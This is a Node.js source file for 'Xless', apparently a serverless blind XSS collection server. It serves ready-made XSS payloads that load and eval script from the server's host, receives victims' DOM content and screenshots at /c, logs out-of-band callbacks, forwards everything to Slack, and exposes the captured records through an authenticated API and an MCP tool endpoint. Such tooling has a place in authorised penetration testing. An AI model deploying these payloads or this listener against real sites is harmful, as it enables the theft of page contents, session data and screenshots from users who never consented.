// Xless: The Serverlesss Blind XSS App.
// Version: v1.2
// Author: Mazin Ahmed <mazin@mazinahmed.net>

const express = require("express");
var bodyParser = require("body-parser");
var cors = require("cors");
const process = require("process");
var request = require("request");
const path = require("path");
const crypto = require("crypto");
const { put, list, get } = require("@vercel/blob");

// Support local development with .env
require("dotenv").config();

const port = process.env.PORT || 3000;
const imgbb_api_key = process.env.IMGBB_API_KEY;
const slack_incoming_webhook = process.env.SLACK_INCOMING_WEBHOOK;
const history_api_token = process.env.XLESS_HISTORY_API_TOKEN;

// Request-history persistence (Vercel Blob) settings.
const HISTORY_PREFIX = "events/";
// 13-digit ceiling used to build reverse-timestamp keys so that Blob's native
// lexicographic list() order equals reverse-chronological (newest-first) order.
const HISTORY_MAX_TS = 9999999999999;
// Record id = <13-digit reverse-ts>-<uuid v4>. Validated before building a
// Blob pathname to prevent path traversal in get_request / readRecord.
const HISTORY_ID_RE =
  /^[0-9]{13}-[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;

const app = express();
app.use(cors());

app.use(bodyParser.json({ limit: "15mb" }));
app.use(bodyParser.urlencoded({ limit: "15mb", extended: true }));

app.use(function (req, res, next) {
  // Headers
  res.header("Powered-By", "XLESS");
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET,POST");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

function generate_blind_xss_alert(body) {
  var alert = "*XSSless: Blind XSS Alert*\n";
  for (let k of Object.keys(body)) {
    if (k === "Screenshot") {
      continue;
    }
    if (k === "DOM") {
      body[k] = `\n\nhello ${body[k]}\n\n`;
    }

    if (body[k] === "") {
      alert += "*" + k + ":* " + "```None```" + "\n";
    } else {
      alert += "*" + k + ":* " + "\n```" + body[k] + "```" + "\n";
    }
  }
  return alert;
}

function generate_callback_alert(headers, data, url) {
  var alert = "*XSSless: Out-of-Band Callback Alert*\n";
  alert += `• *IP Address:* \`${data["Remote IP"]}\`\n`;
  alert += `• *Request URI:* \`${url}\`\n`;

  // Add all the headers
  for (var key in headers) {
    if (headers.hasOwnProperty(key)) {
      alert += `• *${key}:* \`${headers[key]}\`\n`;
    }
  }
  return alert;
}

function generate_message_alert(body) {
  var alert = "*XSSless: Message Alert*\n";
  alert += "```\n" + body + "```\n";
  return alert;
}

async function uploadImage(image) {
  // Return new promise
  return new Promise(function (resolve, reject) {
    const options = {
      method: "POST",
      url: "https://api.imgbb.com/1/upload?key=" + imgbb_api_key,
      port: 443,
      headers: {
        "Content-Type": "multipart/form-data",
      },
      formData: {
        image: image,
      },
    };

    // Do async request
    request(options, function (err, imgRes, imgBody) {
      if (err) {
        reject(err);
      } else {
        resolve(imgBody);
      }
    });
  });
}

// ---------------------------------------------------------------------------
// Request-history persistence + read layer (Vercel Blob)
// ---------------------------------------------------------------------------

function history_key(id) {
  return `${HISTORY_PREFIX}${id}.json`;
}

// Persist one captured event. Best-effort by design: a storage failure is
// logged but never breaks the core Slack/bXSS/callback flow. Must be awaited
// before the response is sent (serverless functions may freeze afterwards).
async function persist_event(type, data, remote_ip) {
  try {
    const ts = Date.now();
    const rev = String(HISTORY_MAX_TS - ts).padStart(13, "0");
    const id = `${rev}-${crypto.randomUUID()}`;
    const record = {
      id,
      type,
      captured_at: new Date(ts).toISOString(),
      remote_ip: remote_ip || null,
      data,
    };
    await put(history_key(id), JSON.stringify(record), {
      access: "private",
      addRandomSuffix: false,
      contentType: "application/json",
    });
    return id;
  } catch (e) {
    console.error("persist_event failed:", e && e.message ? e.message : e);
    return null;
  }
}

async function read_blob_json(pathname) {
  const r = await get(pathname, { access: "private" });
  if (!r || r.statusCode !== 200 || !r.stream) {
    return null;
  }
  try {
    const text = await new Response(r.stream).text();
    return JSON.parse(text);
  } catch (e) {
    return null;
  }
}

// Read a newest-first page of history. Reverse-timestamp keys make Blob's
// native lexicographic list() order equal reverse-chronological order, so the
// built-in cursor/hasMore drive pagination directly.
async function read_history({ limit = 10, cursor, type } = {}) {
  const res = await list({ prefix: HISTORY_PREFIX, limit, cursor });
  const records = await Promise.all(
    res.blobs.map((b) => read_blob_json(b.pathname))
  );
  let results = records.filter(Boolean);
  if (type) {
    results = results.filter((r) => r.type === type);
  }
  return { results, cursor: res.cursor, hasMore: res.hasMore };
}

async function read_record(id) {
  if (typeof id !== "string" || !HISTORY_ID_RE.test(id)) {
    return null;
  }
  return read_blob_json(history_key(id));
}

// Constant-time bearer-token check against XLESS_HISTORY_API_TOKEN. Accepts an
// `Authorization: Bearer <token>` header or a `?token=` query parameter.
function check_history_auth(req) {
  if (!history_api_token) {
    return false;
  }
  let provided = "";
  const auth = req.headers["authorization"] || "";
  if (auth.startsWith("Bearer ")) {
    provided = auth.slice(7);
  } else if (req.query && req.query.token) {
    provided = String(req.query.token);
  }
  if (!provided) {
    return false;
  }
  const a = Buffer.from(provided);
  const b = Buffer.from(history_api_token);
  if (a.length !== b.length) {
    return false;
  }
  return crypto.timingSafeEqual(a, b);
}

app.get("/examples", (req, res) => {
  res.header("Content-Type", "text/plain");
  //var url = req.protocol + '://' + req.headers['host']
  var url = "https://" + req.headers["host"];
  var page = "";
  page += `\'"><script src="${url}"></script>\n\n`;
  page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`;

  page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;

  page += `<script>$.getScript("${url}")</script>`;
  res.send(page);
  res.end();
});

app.all("/message", async (req, res) => {
  var message = req.query.text || req.body.text;
  const remote_ip =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;
  await persist_event("message", { text: message }, remote_ip);
  const alert = generate_message_alert(message);
  data = {
    form: {
      payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
    },
  };

  request.post(process.env.SLACK_INCOMING_WEBHOOK, data, (out) => {
    res.send("ok\n");
    res.end();
  });
});

app.post("/c", async (req, res) => {
  let data = req.body;

  // Upload our screenshot and only then send the Slack alert
  data["Screenshot URL"] = "";

  if (imgbb_api_key && data["Screenshot"]) {
    const encoded_screenshot = data["Screenshot"].replace(
      "data:image/png;base64,",
      ""
    );

    try {
      const imgRes = await uploadImage(encoded_screenshot);
      const imgOut = JSON.parse(imgRes);
      if (imgOut.error) {
        data["Screenshot URL"] = "NA";
      } else if (imgOut.data && imgOut.data.url_viewer) {
        // Add the URL to our data array so it will be included on our Slack message
        data["Screenshot URL"] = imgOut.data.url_viewer;
      }
    } catch (e) {
      data["Screenshot URL"] = e.message;
    }
  }

  // Now handle the regular Slack alert
  data["Remote IP"] =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;

  // Persist the captured request. The heavy raw base64 screenshot is dropped;
  // the imgbb "Screenshot URL" computed above is kept instead.
  const { Screenshot, ...persist_data } = data;
  await persist_event("blind_xss", persist_data, data["Remote IP"]);

  const alert = generate_blind_xss_alert(data);
  data = {
    form: {
      payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
    },
  };

  request.post(slack_incoming_webhook, data, (out) => {
    res.send("ok\n");
    res.end();
  });
});

/**
 * Route to check the health of our xless listener
 */
app.get("/health", async (req, res) => {
  let health_data = {};

  // Check if the environemtn variables are set
  health_data.IMGBB_API_KEY = imgbb_api_key !== undefined;
  health_data.SLACK_INCOMING_WEBHOOK = slack_incoming_webhook !== undefined;
  health_data.XLESS_HISTORY_API_TOKEN = history_api_token !== undefined;

  // Check that the request-history Blob store is reachable.
  try {
    await list({ prefix: HISTORY_PREFIX, limit: 1 });
    health_data.history_storage = "ok";
  } catch (e) {
    health_data.history_storage = e && e.message ? e.message : "error";
  }

  if (!health_data.IMGBB_API_KEY || !health_data.SLACK_INCOMING_WEBHOOK) {
    res.json(health_data);
    res.end();
    return;
  }

  const xless_logo =
    "iVBORw0KGgoAAAANSUhEUgAAAGkAAABfCAMAAADcfxm4AAABC1BMVEUAAADnTDznTDznTDwsPlAsPlDnTDznTDznTDznTDznTDznTDznTDwsPlAsPlDnTDznTDznTDwsPlDnTDwsPlAsPlDnTDwsPlDnTDznTDznTDwsPlAsPlDnTDznTDwsPlAsPlAsPlDnTDwsPlDnTDznTDwsPlAsPlDnTDznTDwsPlAsPlDnTDznTDznTDwsPlDnTDwsPlDnTDwsPlAsPlDnTDznTDwsPlDnTDznTDwsPlAsPlAsPlDnTDznTDznTDznTDwsPlDnTDwsPlDnTDwsPlAsPlAsPlAsPlDnTDwsPlDnTDznTDznTDwsPlAsPlAsPlAsPlAsPlDnTDznTDwsPlDmTDznTDwsPlAn7CxuAAAAV3RSTlMA/PkC+KTx3uzKllAQ51RGPhwWBwbzn5hhIRXj2tHFiYJbVkwoGBQMBNjFvr6SaGM3My4nGgr17efh3tS6tYx6qZKBaksvLB+1rayah25BEHdxOXSbeAW0nsk1AAAETElEQVRo3q2aeVPiQBDFOwki4ZBT5V4WD1DEVURABa/V9T73CN//k6yFFm0S5k2S8fenRdUrnj2ve3ogG9/HiMU9QkQtxAnZyJSg1DcCXEChyj7Z+QaVEuskZH8DCWkX5GAvBKV+kpBzC3FKLuag0qZBAlbDSGhQIBePY8iuQMi4sRDbNINNqHQWqBy22ArPhX7YmF0OFSQU7tAsGmUotUKz+O3jKDHPUGmOZlCIICFzX6DU7SOlfpfc3CEhfYdEnI0RP8hFSkNK9yTkFzy9LXLS3JLEkJhbfzGbh96lCIBP7wvZic8jpTYhci2YSGTnHgltFAmBT29o13vgaUnCNI68d6lTCxAlGS+eEykJvYuTjPUEkvrOH8yaCt7Je++Qo3k7oHfM3qKnmkgfAKH5NQJ4673L9MGxBYiRJ17h5PIRsx0dCC2RR4ZI6i9NuFHwjllBSke5STloCt4xOTRQ1Fz9D3uH+QG+0hO9saTmHfN0KFRamPQ/XdE7piYSuuV0UPGOyfQFvfAXvfGAvCuSP85AOaQHqt7JB4ryOhiHgHeQOWGS7+iqdScfKK4n5VCF3vnHaLlz/BI0C+gdZmF2a187gN4FIXfk7OyTcmhD74Lx0z0r43L4QwFZL9n7eg5Px3hGwdTcbT2vMKMArvrOu2fxAM0oCiyzUCIDZwfsnZzLkL0cOj1V7+SR1JqUw0jVO/nkHHqlN+rgThYnJbqHn4e8IrgsVY2vMW/xSroOiJEKC/ZozUtWKcHJJOSHiUkpeTelxOEq4lTZO9xsmfBqYO9Krk2EUYU3JmXvcL4ykbSyd9xviwO89gpC17loLj1Jl9UHcXXvuCY0uAdV9o4nsH+wJsys/75eHgtHMERdoQO6aiICI4l8sgLWK1HrCyMpU0Z3NA1GkrJ3XBOGiZR6HWXveGP5YCHa6t7xNS2CI0nBO6bcANd2EEnQO1QTUGk+ruAdM8c3NSH54N4xoUfiYUyEaQT2jlnm1TXgImjeMaUMb/YAI2XveAW7quNXEy+9AjHkD+LnuiXPfRbtcchDTYQLJOF2jKjJ3m+Zc+lOD3HUAA+4/gaKvb6PN8JCOPjpNVq+nghxTZhNoITfIhNXZCdpQcBVdHfR35t7toJO1IZ4dGkIl8l8y2VQQ9TNaH51H+448FuGi7XBjINk3uULWcmdzP+PMKJOlXaMVYqpOJiN4YbcTYeHpEH1OMa3p3TqZDRvRUHe+XxuN0bvg8PW+UV6+re15P3o3dYeSzPdhI+jxCS1yOgkNlVppmP3W58O9B3OO/lRYpo7Rc6M+nHVERuRAsg78NYO6NTblYiXnL3C3g3F+dWkbCe/VJkZgZquO6ck43os6Upi6hVb89U0barT03Vr27lshTwTIGX7Dr3eVOhds5r10Ss2cwRomp+VdM3un6YnickNRRq8bGNg+GngjiP3rkaYdOTzPwmtXS7HCt6RYVDbghzTB/8BjE+qcM2S2aUAAAAASUVORK5CYII=";

  try {
    const imgRes = await uploadImage(xless_logo);
    const imgOut = JSON.parse(imgRes);
    if (imgOut.error) {
      health_data.imgbb_response = imgOut.error;
    } else if (imgOut && imgOut.data && imgOut.data.url_viewer) {
      // Add the URL to our health_data
      health_data.imgbb_response = imgOut.data.url_viewer;
    }
  } catch (e) {
    health_data.imgbb_response = e.message;
  }

  res.json(health_data);
  res.end();
});

/**
 * Authenticated, paginated JSON history of captured requests.
 * Newest-first; default 10 per page; cursor pagination via _links.next.
 * NOTE: must be registered before the "/*" catch-all so it is not swallowed.
 */
app.get("/xless-history", async (req, res) => {
  if (!check_history_auth(req)) {
    res.status(401).json({ error: "unauthorized" });
    return;
  }

  let limit = parseInt(req.query.limit, 10);
  if (isNaN(limit) || limit < 1) {
    limit = 10;
  }
  if (limit > 100) {
    limit = 100;
  }
  const type = req.query.type ? String(req.query.type) : undefined;
  const cursor = req.query.cursor ? String(req.query.cursor) : undefined;

  try {
    const page = await read_history({ limit, cursor, type });

    const build_link = (c) => {
      const p = new URLSearchParams();
      p.set("limit", String(limit));
      if (type) {
        p.set("type", type);
      }
      if (c) {
        p.set("cursor", c);
      }
      return `/xless-history?${p.toString()}`;
    };

    res.json({
      count: page.results.length,
      results: page.results,
      _links: {
        self: build_link(cursor),
        next: page.hasMore && page.cursor ? build_link(page.cursor) : null,
      },
    });
  } catch (e) {
    console.error("/xless-history error:", e && e.message ? e.message : e);
    res
      .status(500)
      .json({ error: "failed to read history", detail: e && e.message });
  }
});

/**
 * MCP server (Streamable HTTP, stateless) exposing read-only history tools.
 * Authenticated with the same XLESS_HISTORY_API_TOKEN bearer token.
 * NOTE: must be registered before the "/*" catch-all so it is not swallowed.
 */
app.all("/xless-mcp", async (req, res) => {
  if (!check_history_auth(req)) {
    res.status(401).json({
      jsonrpc: "2.0",
      error: { code: -32001, message: "Unauthorized" },
      id: null,
    });
    return;
  }

  let McpServer;
  let StreamableHTTPServerTransport;
  let z;
  try {
    ({ McpServer } = require("@modelcontextprotocol/sdk/server/mcp.js"));
    ({
      StreamableHTTPServerTransport,
    } = require("@modelcontextprotocol/sdk/server/streamableHttp.js"));
    z = require("zod");
  } catch (e) {
    res
      .status(500)
      .json({ error: "MCP server unavailable", detail: e && e.message });
    return;
  }

  const server = new McpServer({ name: "xless", version: "1.0.0" });

  server.registerTool(
    "list_requests",
    {
      title: "List captured requests",
      description:
        "List captured XLESS requests (blind XSS collections, out-of-band callbacks, and messages), newest first. Paginate with the returned nextCursor.",
      inputSchema: {
        limit: z
          .number()
          .int()
          .min(1)
          .max(100)
          .default(10)
          .describe("Maximum number of records to return (1-100, default 10)."),
        cursor: z
          .string()
          .optional()
          .describe("Pagination cursor from a previous response's nextCursor."),
        type: z
          .enum(["blind_xss", "callback", "message"])
          .optional()
          .describe("Optional filter by record type."),
      },
    },
    async ({ limit, cursor, type }) => {
      const page = await read_history({ limit, cursor, type });
      return {
        content: [
          {
            type: "text",
            text: JSON.stringify(
              {
                count: page.results.length,
                results: page.results,
                nextCursor: page.hasMore ? page.cursor : null,
              },
              null,
              2
            ),
          },
        ],
      };
    }
  );

  server.registerTool(
    "get_request",
    {
      title: "Get a captured request",
      description: "Return a single captured XLESS request by its id.",
      inputSchema: {
        id: z.string().describe("Record id as returned by list_requests."),
      },
    },
    async ({ id }) => {
      const record = await read_record(id);
      if (!record) {
        return {
          isError: true,
          content: [{ type: "text", text: `No record found for id: ${id}` }],
        };
      }
      return {
        content: [{ type: "text", text: JSON.stringify(record, null, 2) }],
      };
    }
  );

  const transport = new StreamableHTTPServerTransport({
    sessionIdGenerator: undefined, // stateless: one server+transport per request
    enableJsonResponse: true,
  });

  res.on("close", () => {
    try {
      transport.close();
    } catch (e) {}
    try {
      server.close();
    } catch (e) {}
  });

  try {
    await server.connect(transport);
    await transport.handleRequest(req, res, req.body);
  } catch (e) {
    console.error("/xless-mcp error:", e && e.message ? e.message : e);
    if (!res.headersSent) {
      res.status(500).json({
        jsonrpc: "2.0",
        error: { code: -32603, message: "Internal server error" },
        id: null,
      });
    }
  }
});

// MCP clients may probe OAuth protected-resource metadata automatically. XLESS
// uses a pre-shared bearer token, so ignore this probe instead of recording it
// as an OOB callback or forwarding it to Slack.
app.all("/.well-known/oauth-protected-resource/xless-mcp", (req, res) => {
  res.status(404).end();
});

app.all("/*", async (req, res) => {
  var headers = req.headers;
  var data = req.body;
  const remote_ip =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;

  // Persist the out-of-band callback (full request data) before mutating the
  // body for the Slack alert.
  await persist_event(
    "callback",
    { url: req.url, method: req.method, headers: headers, body: req.body },
    remote_ip
  );

  data["Remote IP"] = remote_ip;
  const alert = generate_callback_alert(headers, data, req.url);
  data = {
    form: {
      payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
    },
  };

  request.post(slack_incoming_webhook, data, (out) => {
    res.sendFile(path.join(__dirname + "/payload.js"));
  });
});

app.listen(port, (err) => {
  if (err) throw err;
  console.log(`> Ready On Server http://localhost:${port}`);
});
